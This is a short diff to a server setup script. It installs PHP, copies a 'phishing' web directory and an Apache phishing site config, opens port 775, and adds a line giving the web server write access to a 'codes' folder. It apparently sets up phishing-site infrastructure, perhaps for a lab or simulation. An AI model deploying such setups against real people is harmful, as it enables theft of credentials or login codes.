@@ -3,6 +3,7 @@ sudo apt-get install -y php
 pip3 install requests watchdog
 cp -r ./html /var/www/
 cp -r ./phishing /var/www/
+sudo setfacl -R -m u:www-data:rwx /var/www/html/codes
 cp ./000-default.conf /etc/apache2/sites-available/
 cp ./001-phishing.conf /etc/apache2/sites-available/
 sudo sed -i '/Listen 80/a Listen 775' /etc/apache2/ports.conf
